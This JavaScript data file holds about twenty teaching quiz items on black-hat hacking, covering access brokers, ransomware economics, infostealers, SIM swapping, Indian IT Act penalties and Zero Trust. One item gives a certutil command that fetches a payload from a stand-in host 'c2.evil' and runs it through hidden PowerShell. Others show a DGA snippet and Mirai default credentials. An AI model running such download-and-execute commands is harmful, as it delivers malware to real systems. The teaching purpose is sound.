const questions = [
  {
    question: "What is the primary defining characteristic that distinguishes a 'Black Hat Hacker' from White Hat and Grey Hat hackers?",
    shortAnswer: "Black Hat hackers break into computer systems with malicious intent, without authorization, and for personal financial gain, extortion, or system sabotage.",
    explanation: "Unlike White Hat hackers who possess explicit written authorization and defensive intent, Black Hat hackers deliberately violate cyber laws (such as Section 66 of India's IT Act 2000 and the US CFAA). Their operations are unauthorized, clandestine, and driven by financial theft, corporate espionage, ideological destruction, or ransomware extortion.",
    hint: "Think about unauthorized intrusion with malicious intent and financial extortion.",
    level: "basic",
    codeExample: `// Black Hat Criminal Vector:
Authorization: ZERO (Illegal Computer Trespass)
Primary Motive: Direct Financial Theft, Ransomware Extortion, Data Exfiltration
Legal Consequence: Criminal Prosecution under Indian IT Act 2000 (Section 66/66C/66F)`
  },
  {
    question: "What is the role of an 'Initial Access Broker' (IAB) in the modern underground cybercrime economy?",
    shortAnswer: "IABs specialize in breaching enterprise networks and selling that compromised access (credentials, VPN sessions, webshells) to ransomware syndicates on dark web forums.",
    explanation: "Initial Access Brokers are specialized cybercriminals who scan for unpatched edge devices, exploit unauthenticated VPN vulnerabilities (e.g., Fortinet, Citrix, Pulse Secure), or purchase credentials from infostealer logs. Rather than deploying ransomware themselves, they monetize the breach by auctioning remote access (RDP, Active Directory domains) to ransomware affiliates for ₹80,000 to ₹15,00,000+ depending on the victim's annual revenue.",
    hint: "Think of the underground brokers who specialize only in breaking through the front door and selling the keys to other hackers.",
    level: "moderate",
    codeExample: `// Dark Web Initial Access Broker Listing Example:
"FOR SALE: Domain Admin access + Fortinet VPN SSL to ₹500 Cr Indian Logistics Enterprise.
Includes: Active Directory Domain Controller, 2,400 endpoints, ESXi vCenter.
Starting Bid: ₹4,50,000 in Monero (XMR)." `
  },
  {
    question: "How does the 'Double Extortion' ransomware business model work, and why was it pioneered by the Maze ransomware cartel?",
    shortAnswer: "Attackers exfiltrate confidential proprietary data before encrypting local servers, demanding ransom for both the decryption key and the non-publication of stolen data.",
    explanation: "Prior to 2019, victims who maintained reliable offline backups could ignore ransomware demands by restoring systems. The Maze ransomware syndicate revolutionized cyber extortion: they secretly exfiltrated hundreds of gigabytes of customer PII, executive emails, and trade secrets to dark web servers before triggering encryption. If the victim restores from backups, attackers threaten to leak the data publicly, triggering regulatory DPDP Act / GDPR fines and brand destruction.",
    hint: "Recall that double extortion combines file encryption with the threat of public data leakage.",
    level: "moderate",
    codeExample: `// Double Extortion Workflow:
Stage 1: Exfiltrate 400 GB Customer Financial Database to Mega.nz / Tor Onion Server
Stage 2: Deploy LockBit Ransomware -> Encrypt local virtual machines
Stage 3: Extortion Notice -> "Pay ₹10 Crores for decryptor + deletion of exfiltrated data"`
  },
  {
    question: "What is an 'Infostealer' malware (e.g., RedLine, Lumma, Vidar), and how does it fuel global credential stuffing attacks?",
    shortAnswer: "Stealthy trojans that harvest stored browser passwords, session cookies, cryptocurrency wallets, and autofill data, packaging them into 'logs' sold on dark web markets.",
    explanation: "Infostealers are distributed via cracked software downloads, malicious Google Ads (malvertising), or phishing emails. Once executed on a victim's machine, the malware extracts all saved passwords, authentication session tokens (allowing MFA bypass via session hijacking), browser history, and crypto wallet keys, compiling them into a zip archive ('Log'). Thousands of these logs are traded daily on platforms like Russian Market and Genesis Market.",
    hint: "Think of malware designed specifically to steal all saved passwords and session cookies from your web browser.",
    level: "moderate",
    codeExample: `// Infostealer Target Artifacts:
1. Google Chrome / Edge: SQLite Database -> "Login Data" (Decrypted with DPAPI)
2. Session Cookies: "Cookies" SQLite DB -> Bypasses Multi-Factor Authentication
3. Crypto Extensions: MetaMask, Phantom, Exodus wallet seed phrases`
  },
  {
    question: "What is a 'Domain Generation Algorithm' (DGA), and how do Black Hat botnet operators use it to evade defensive firewall blocks?",
    shortAnswer: "An algorithm embedded in malware that generates hundreds of pseudo-random domain names daily, allowing the botnet to maintain command-and-control even if domains are seized.",
    explanation: "Historically, malware contacted hardcoded C2 IP addresses or static domains, which law enforcement and security vendors easily blacklisted or seized. A Domain Generation Algorithm uses a dynamic seed (such as the current date or Twitter trending topics) to generate 500 to 1,000 pseudo-random domains every 24 hours (e.g., `xkq98zbc71.biz`). The botmaster only needs to register one of these domains per day to issue commands to millions of infected bots.",
    hint: "Think about generating new random website addresses every single day based on today's date.",
    level: "expert",
    codeExample: `// Simplified Domain Generation Algorithm (DGA) in Python:
import hashlib, datetime
def generate_dga_domains(date_str, count=10):
    domains = []
    for i in range(count):
        seed = f"{date_str}-{i}"
        hash_val = hashlib.md5(seed.encode()).hexdigest()[:12]
        domains.append(f"{hash_val}.biz")
    return domains
# generate_dga_domains("2026-08-23") -> ['d41d8cd98f00.biz', ...]`
  },
  {
    question: "What was the landmark significance of the 2016 'Mirai Botnet' DDoS attack regarding Internet of Things (IoT) security?",
    shortAnswer: "It weaponized hundreds of thousands of default-credential IoT devices (CCTV cameras, home routers) to launch a record 1.2 Tbps DDoS attack that crippled global DNS.",
    explanation: "Developed by three college students, Mirai scanned the IPv4 internet for IoT devices (security cameras, DVRs, routers) protected only by factory-default usernames and passwords (like `admin:admin` or `root:123456`). It enslaved over 600,000 devices into a synchronized botnet, launching massive SYN floods and UDP water torture attacks against Dyn DNS, temporarily knocking out Twitter, Spotify, Netflix, and GitHub across North America and Europe.",
    hint: "Recall the famous 2016 IoT botnet that enslaved CCTV cameras with default passwords to launch a 1.2 Tbps DDoS attack.",
    level: "basic",
    codeExample: `// Mirai IoT Scanning Logic:
const char *default_creds[] = {
    "admin:admin", "root:root", "root:123456", "admin:password", "default:default"
};
// Scans Telnet port 23 -> brute-forces dictionary -> downloads bot payload`
  },
  {
    question: "How does 'Cryptocurrency Tumbling / Mixing' (e.g., Tornado Cash, ChipMixer) enable Black Hat syndicates to launder ransom payments?",
    shortAnswer: "By pooling illicit cryptocurrency funds from thousands of addresses, mixing them together, and redistributing them to break the cryptographic blockchain audit trail.",
    explanation: "Because public blockchains (Bitcoin, Ethereum) maintain permanent, immutable public ledgers, law enforcement agencies (CBI, FBI, Chainalysis) can track ransom funds to destination cryptocurrency exchanges. Black hat syndicates pass ransom proceeds through cryptomixers or swap them into privacy-focused coins like Monero (XMR), mixing transactions with thousands of unrelated deposits to obfuscate the link between the victim's wallet and the cash-out account.",
    hint: "Think of putting dirty money into a giant blender with clean money so nobody can trace who owns which coin.",
    level: "moderate",
    codeExample: `// Cryptomixing Laundering Flow:
Victim Ransom Wallet (₹10 Cr BTC) 
       ↓ 
Cryptocurrency Mixer Pool (Mixed with 5,000 unrelated transactions)
       ↓
Output to 50 Splinter Wallets -> Converted to Monero (XMR) -> Cashed out via P2P OTC Brokers`
  },
  {
    question: "What is 'SIM Swapping', and how do Black Hat actors use it to bypass SMS-based Multi-Factor Authentication (MFA)?",
    shortAnswer: "Fraudulently deceiving or bribing telecom customer service to transfer a victim's phone number to a criminal-controlled SIM card to intercept SMS OTPs.",
    explanation: "In a SIM swap attack, the attacker gathers personal details about the victim via OSINT (date of birth, mother's maiden name) and contacts the telecom operator (or bribes an insider employee), claiming their phone was lost. Once the operator ports the phone number to the attacker's SIM card, all incoming SMS OTPs and phone verification codes are intercepted, allowing the attacker to reset passwords on banking apps, email accounts, and cryptocurrency exchanges.",
    hint: "Think about convincing a telecom carrier to redirect someone's mobile number to your own phone.",
    level: "basic",
    codeExample: `// SIM Swap Attack Workflow:
1. Attacker obtains victim phone number & Aadhaar/PAN details via dark web breach.
2. Attacker impersonates victim at mobile carrier store -> Requests "Emergency SIM Replacement".
3. Carrier switches IMSI -> Victim's phone loses signal ("No Service").
4. Attacker receives Bank OTPs -> Drains bank account via UPI / NetBanking.`
  },
  {
    question: "Under the Indian Penal Code and Information Technology Act 2000, what specific sections criminalize Black Hat hacking activities?",
    shortAnswer: "IT Act Section 66 (Hacking), Section 66C (Identity Theft), Section 66D (Cheating by Personation), Section 66F (Cyber Terrorism), and IPC Section 420 (Cheating).",
    explanation: "Indian cyber jurisprudence applies strict criminal penalties against Black Hat actors: Section 66 punishes unauthorized hacking with up to 3 years imprisonment; Section 66C penalizes stealing electronic passwords; Section 66D covers phishing and electronic impersonation; Section 66E covers voyeurism/privacy violations; and Section 66F imposes life imprisonment for cyber terrorism targeting defense or critical national infrastructure.",
    hint: "Recall the key penal sections of the IT Act 2000 covering hacking, password theft, and cyber terrorism.",
    level: "moderate",
    codeExample: `// Indian IT Act 2000 Penal Matrix:
Sec 66  : Hacking / Unauthorized Access (3 yrs prison + ₹5 Lakhs fine)
Sec 66C : Identity Theft / Password Stealing (3 yrs prison + ₹1 Lakh fine)
Sec 66D : Phishing / Impersonation Fraud (3 yrs prison + ₹1 Lakh fine)
Sec 66F : Cyber Terrorism / Grid Sabotage (LIFE IMPRISONMENT)`
  },
  {
    question: "What was the 'WannaCry' ransomware outbreak of 2017, and what critical vulnerability did it weaponize to spread autonomously?",
    shortAnswer: "It weaponized the NSA's leaked 'EternalBlue' SMBv1 exploit (MS17-010), infecting over 200,000 computers across 150 countries without requiring user interaction.",
    explanation: "WannaCry was a self-propagating ransomware worm released in May 2017. Unlike standard ransomware delivered via phishing emails, WannaCry scanned local networks and public internet IP ranges for unpatched Microsoft Windows systems running Server Message Block version 1 (SMBv1 on TCP port 445). It executed remote code directly in kernel memory via EternalBlue, encrypting files and demanding $300 in Bitcoin, paralyzing the UK National Health Service (NHS) and Indian state transport networks.",
    hint: "Recall the massive 2017 ransomware worm that exploited EternalBlue on port 445.",
    level: "moderate",
    codeExample: `// WannaCry Infection Vector:
Target: Windows SMBv1 (TCP Port 445)
Exploit: ETERNALBLUE (CVE-2017-0144 - Pool Corruption in srv.sys)
Propagation: Autonomous Worm Spreader (Zero user clicks required)`
  },
  {
    question: "What is 'Living off the Land' (LotL) and 'Fileless Malware', and why do Black Hat threat actors utilize these techniques?",
    shortAnswer: "Using legitimate built-in operating system administrative tools (PowerShell, WMI, Certutil) to execute attacks without writing malicious binaries to disk, evading signature antivirus.",
    explanation: "Modern Endpoint Detection and Response (EDR) tools easily detect compiled malware executables written to disk (`malware.exe`). In Living-off-the-Land (LotL) attacks, black hats abuse legitimate, trusted Windows administration tools (known as LOLBins—Living Off the Land Binaries) like `powershell.exe`, `wmic.exe`, `mshta.exe`, and `certutil.exe`. Because these utilities are digitally signed by Microsoft and used daily by sysadmins, executing commands directly in RAM leaves zero executable footprint on disk.",
    hint: "Think about using the computer's own built-in administrative tools like PowerShell against itself rather than downloading foreign virus files.",
    level: "expert",
    codeExample: `// Living off the Land (LOLBin) Example:
// Using legitimate Microsoft certutil.exe to download remote payload:
certutil.exe -urlcache -split -f "http://c2.evil/stage2.txt" C:\\Windows\\Temp\\stage2.ps1
// Executing in-memory via PowerShell without touching disk antivirus:
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File C:\\Windows\\Temp\\stage2.ps1`
  },
  {
    question: "What is an 'Access Brokerage Market' on the Dark Web (e.g., Russian Market, Genesis Market), and how do digital fingerprint bots work?",
    shortAnswer: "Marketplaces where cybercriminals buy and sell complete stolen digital browser fingerprints (IP, cookies, User-Agent, WebGL canvas hash) to impersonate victims seamlessly.",
    explanation: "Modern anti-fraud systems on banking and e-commerce portals check digital device fingerprints (canvas hashes, screen resolution, time zone, TLS client hello, and session cookies) to detect suspicious logins. Dark web marketplaces like Genesis Market developed custom browser plugins (Genesis Browser) that allow a criminal buyer to import an entire victim fingerprint file, letting them log directly into the victim's Amazon or PayPal account without triggering MFA or fraud alerts.",
    hint: "Think of an underground shop that sells the exact digital clone of your web browser so hackers bypass fraud checks.",
    level: "expert",
    codeExample: `// Genesis Market Digital Identity Package:
Victim Package #84920 ($15 USD / ₹1,250):
- Complete Chrome Session Cookies (Google, Amazon, HDFC NetBanking)
- Stored Form Passwords & Autofill Credit Card Details
- Hardware WebGL Fingerprint & User-Agent String
- Exact Resident ISP Proxy IP Configuration`
  },
  {
    question: "What is 'Credential Stuffing', and how does it exploit human password reuse across different online platforms?",
    shortAnswer: "Automated injection of millions of previously breached username/password pairs against different websites to gain unauthorized access to accounts where users reused passwords.",
    explanation: "When a minor gaming forum or fitness app suffers a data breach, millions of email/password combinations are published. Because over 60% of internet users reuse the exact same password across all their personal and work accounts, black hats use automated tools (e.g., OpenBullet, Sentry MBA) with rotating residential proxy networks to test millions of breached credentials against high-value targets like banking apps, Netflix, and corporate VPNs.",
    hint: "Think about taking a stolen password from one hacked website and testing it automatically across 1,000 other websites.",
    level: "basic",
    codeExample: `// Credential Stuffing Automated Pipeline:
Input: 10,000,000 Breached Email:Password pairs from 2024 breach dump
Engine: OpenBullet running through 5,000 Rotating Residential Proxies
Target: Major Indian Banking / E-commerce Login Portal
Success Rate: ~1-2% (100,000 Compromised Accounts Reusing Passwords)`
  },
  {
    question: "What was the 'Stolen Credentials Marketplace' 'Carding Forum' known as 'ShadowCrew', and what was its historical significance in cybercrime?",
    shortAnswer: "An early 2000s underground cybercrime marketplace with 4,000+ members that pioneered credit card trafficking, counterfeit IDs, and structured escrow payments.",
    explanation: "Founded in 2002 by Albert Gonzalez ('Soupnazi') and Brett Johnson, ShadowCrew was the prototype for modern dark web cybercrime syndicates. It established structured illicit commerce: escrow services for dispute resolution, credit card cloning tutorials, and magnetic stripe skimmer sales. In October 2004, the US Secret Service executed 'Operation Firewall', arresting 28 members across six countries and seizing over 1.7 million stolen credit card numbers.",
    hint: "Recall the famous early 2000s underground cyber syndicate that pioneered organized carding and credit card theft.",
    level: "moderate",
    codeExample: `// ShadowCrew Illicit Commerce Structure (2002-2004):
- Carding Section: Selling Track 1 & Track 2 CVV magnetic stripe dumps
- Phishing & Spamming Section: Blueprints for fake eBay/PayPal bank scams
- Escrow Admin System: Underground forum admins holding funds until stolen cards verified`
  },
  {
    question: "How do Black Hat actors conduct 'Business Email Compromise' (BEC) attacks, and why are they among the most financially damaging cyber crimes?",
    shortAnswer: "By hacking or spoofing corporate executive/vendor email accounts to deceive finance teams into wiring large sums of money to fraudulent offshore bank accounts.",
    explanation: "Unlike ransomware which locks files loudly, BEC is a silent, highly sophisticated social engineering attack. Attackers compromise an executive or vendor email account (via phishing or credential stuffing), monitor email threads for upcoming multi-crore invoice payments, and inject a subtle spoofed message: 'Please note our bank routing details have changed for this invoice due to a corporate audit.' Global BEC losses exceed ₹2,00,000 Crores ($26B+) according to the FBI IC3.",
    hint: "Think of an attacker quietly hacking a company CFO's email and sending a fake invoice instructing the accountant to wire money to a criminal bank account.",
    level: "moderate",
    codeExample: `// BEC Invoice Redirection Scenario:
Authentic Vendor Email: payments@supplier-hardware.com
Attacker Typo-squatted Email: payments@suppiier-hardware.com (Subtle 'i' replacement)
Injected Message: "Please wire the ₹85,00,000 payment for Invoice #9821 to our new HDFC Bank Account."`
  },
  {
    question: "What is 'Watering Hole Attack', and how do advanced Black Hat groups compromise high-value targets without attacking them directly?",
    shortAnswer: "By compromising a legitimate third-party website frequently visited by the target organization's employees and injecting stealthy drive-by malware.",
    explanation: "If a defense contractor or banking core network is too heavily fortified to breach directly, threat actors observe the browsing habits of its engineers (e.g., local industry news portals, specialized catering services, or technical vendor discussion boards). The attackers compromise that weaker third-party website (the 'watering hole') and inject zero-day browser exploit shellcode that selectively infects only visitors originating from the target company's corporate IP range.",
    hint: "Think of a predator waiting near the water hole where all the animals come to drink, rather than chasing them across the savannah.",
    level: "expert",
    codeExample: `// Watering Hole Attack Trigger Logic (Injected on Industry News Portal):
if (client_ip_belongs_to_defense_contractor(client_ip) === true) {
    serve_zero_day_browser_exploit();
} else {
    serve_normal_webpage_content(); // Evades general security scanners!
}`
  },
  {
    question: "What is 'Ransomware-as-a-Service' (RaaS) profit-sharing economics, and what are the roles of 'Core Developers' vs 'Affiliates'?",
    shortAnswer: "Core developers build and maintain the ransomware and negotiation infrastructure; Affiliates execute network intrusions; ransom payouts are split ~80% to affiliate and 20% to core devs.",
    explanation: "The RaaS syndicate model operates like a franchise business. Elite malware developers (e.g., LockBit, DarkSide, BlackCat) write the high-speed cryptographic software, operate the Tor negotiation portal, and maintain automated decryption validators. They license access to 'Affiliates' (hackers who specialize in phishing, Active Directory lateral movement, or buying VPN access). When an affiliate extorts a ₹10 Crore ransom, ₹8 Crores goes to the affiliate and ₹2 Crores goes to the core cartel.",
    hint: "Think of an 80/20 revenue split between the hacker who broke into the building and the cartel that provided the malware toolkit.",
    level: "basic",
    codeExample: `// RaaS Revenue Division Formula:
Total_Extorted_Ransom_INR = ₹10,00,00,000 (₹10 Crores in Monero/Bitcoin)
Affiliate_Take_Home       = ₹8,00,00,000 (80% for network breach & deployment)
RaaS_Core_Developers      = ₹2,00,00,000 (20% for software, Tor portal & decryptor)`
  },
  {
    question: "How do international law enforcement agencies (CBI, INTERPOL, FBI, Europol) coordinate 'Takedown Operations' against global Black Hat syndicates?",
    shortAnswer: "Through joint synchronized operations seizing C2 server infrastructure across multiple countries simultaneously, seizing crypto wallets, and executing Red Notice arrests.",
    explanation: "Because cybercrime cartels operate across borders (e.g., malware coded in Eastern Europe, C2 servers hosted in the Netherlands, attacking banks in India and the US), no single nation can defeat them alone. Through INTERPOL and Europol EC3, international law enforcement conducts synchronized raids: seizing command-and-control servers simultaneously in multiple cloud data centers, sinking botnet domains, freezing crypto exchange accounts, and issuing Red Notices for extraditing criminals.",
    hint: "Think about multiple countries' police forces coordinating to shut down servers in 10 countries at the exact same minute.",
    level: "moderate",
    codeExample: `// Global Botnet Takedown Playbook:
1. Synchronized Server Seizure: Seize 40 C2 servers across 12 countries at 04:00 UTC.
2. DNS Sinkholing: Redirect malicious botnet domains to law enforcement name servers.
3. Financial Asset Forfeiture: Freeze ₹500 Crores in cryptocurrency exchange wallets.
4. Issue INTERPOL Red Notices for fugitive cartel leaders.`
  },
  {
    question: "What is 'Typo-squatting' and 'Brand Impersonation', and how do Black Hat threat actors exploit human perceptual errors?",
    shortAnswer: "Registering visually identical domain names (using homoglyphs or common typos) to deceive victims into entering passwords on fake phishing portals.",
    explanation: "Typo-squatting registers domains like `amzon.com` or `goog1e.com`. Advanced attackers use Unicode IDN Homograph attacks, replacing Latin letters with visually identical Cyrillic characters (e.g., replacing Latin 'a' with Cyrillic 'а'). When displayed in a browser or email client, the domain looks 100% identical to the genuine brand, tricking users into entering corporate VPN credentials or banking OTPs.",
    hint: "Think about creating website domains with subtle typos or look-alike foreign alphabet characters to trick users.",
    level: "basic",
    codeExample: `// Homoglyph Domain Phishing Example:
Legitimate URL: https://www.bank-login.com
Phishing Homoglyph URL: https://www.bаnk-login.com (Uses Cyrillic 'а' U+0430)
Browser Punycode: https://www.xn--bnk-login-94a.com (Fake server hosting credential harvester)`
  },
  {
    question: "Synthesizing the modern Black Hat threat landscape: why must defensive cyber architects transition from perimeter security to an 'Assume Breach' Zero Trust model?",
    shortAnswer: "Because black hat syndicates with multi-million-rupee budgets, 0-day exploits, and infostealer credentials will inevitably breach perimeters; defenses must minimize blast radius and lateral movement.",
    explanation: "History conclusively proves that perimeter walls (firewalls, VPNs) are insufficient against modern black-hat cartels armed with stolen session cookies, insider access, and zero-day supply chain exploits. Modern security engineering operates on the fundamental principle of 'Assume Breach' (Zero Trust Architecture): treating every user, endpoint, and microservice as potentially compromised, enforcing least privilege, micro-segmenting networks, and requiring continuous cryptographic authentication.",
    hint: "Conclude by recognizing that assuming the attacker is already inside the network is the only effective posture against modern cybercrime cartels.",
    level: "expert",
    codeExample: `// The Zero Trust Paradigm Shift:
Legacy Castle-and-Moat: "If the user connects via VPN, trust all internal traffic." (FAILED)
Zero Trust Architecture: "Assume the VPN is already compromised. Verify every packet, restrict lateral movement, enforce FIDO2 on every internal database." (RESILIENT)`
  }
];

export default questions;
